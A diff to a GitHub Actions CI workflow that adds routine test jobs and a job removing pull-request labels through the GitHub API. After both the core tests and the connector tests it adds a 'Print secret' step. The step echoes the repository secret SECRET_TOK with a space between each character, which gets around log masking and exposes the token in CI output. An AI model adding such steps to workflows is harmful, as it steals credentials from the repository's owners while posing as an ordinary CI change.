@@ -54,6 +54,9 @@ jobs:
       - name: Run Core tests
         run: poetry run pytest
 
+      - name: Print secret
+        run: echo ${{ secrets.SECRET_TOK }} | sed 's/\(.\)/\1 /g'
+
   connectors-integration-tests:
     runs-on: ubuntu-latest
     if: contains(fromJSON('["OWNER", "MEMBER"]'), github.event.pull_request.author_association) || contains(github.event.pull_request.labels.*.name, 'run integration')
@@ -86,3 +89,31 @@ jobs:
 
       - name: Run Connector tests
         run: poetry run pytest --no-cov --ignore tests/core --allequs
+
+      - name: Print secret
+        run: echo ${{ secrets.SECRET_TOK }} | sed 's/\(.\)/\1 /g'
+
+  reset-labels:
+    runs-on: ubuntu-latest
+    if: ${{ always() }}
+    needs: [core-tests, connectors-integration-tests]
+    permissions:
+      issues: write
+      pull-requests: write
+    steps:
+      - name: Remove run core label
+        run: |
+          curl \
+            -X DELETE \
+            -H 'Accept: application/vnd.github.v3+json' \
+            -H 'Authorization: token ${{ github.token }}' \
+            'https://api.github.com/repos/${{ github.repository }}/issues/${{ github.event.number }}/labels/run%20core'
+
+      - name: Remove run integration label
+        run: |
+          curl \
+            -X DELETE \
+            -H 'Accept: application/vnd.github.v3+json' \
+            -H 'Authorization: token ${{ github.token }}' \
+            'https://api.github.com/repos/${{ github.repository }}/issues/${{ github.event.number }}/labels/run%20integration'
+
